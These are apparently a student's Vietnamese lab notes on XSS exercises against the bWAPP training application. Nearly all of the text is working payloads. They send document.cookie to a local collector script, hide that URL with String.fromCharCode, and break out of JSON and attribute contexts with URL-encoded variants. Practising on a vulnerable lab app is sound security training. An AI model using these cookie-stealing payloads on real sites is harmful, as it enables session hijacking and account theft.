Thực nghiệm 1: <script>window.open('http://localhost:8080/tn1/get.php?cookie=' + document. cookie)</script> => Lấy cookie => f12 vào login bwap https://bwapp.hakhub.net/portal.php
Thực nghiệm 2: <script>alert("XSS")</script> => <script>alert(String.fromCharCode(88, 83, 83))</script> => xong vào web https://charcode98.neocities.org/ để chuyển http://localhost:8080/tn1/get.php?cookie= thành dạng số
   		=> <script>window.open(String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 56, 48, 56, 48, 47, 116, 110, 49, 47, 103, 101, 116, 46, 112, 104, 112, 63, 99, 111, 111, 107, 105, 101, 61) + document. cookie)</script>
Thực nghiệm 4: Giống y hệ Thực nghiệm 2
Thực nghiệm 5: làm các bước theo hd rồi cuối cùng chạy "}]}';window.open('http://localhost:8080/tn1/get.php?cookie=
Thực nghiệm 6: làm như hd => cuối cùng chạy '><script>window.open('http://localhost:8080/tn1/get.php?cookie=' + document. cookie)</script>
Thực nghiệm 7: làm như hd => cuối cùng chạy )");window.open(%27http%3A%2F%2Flocalhost%2Flab1%2Fget.php%3Fcookie%3D%27%20%2B%20document.%20cookie)<%2Fscript>
Thực nghiệm 8: 

<script>alert('DIEP')</script>

<script>alert(String.fromCharCode(88,83,83))<script>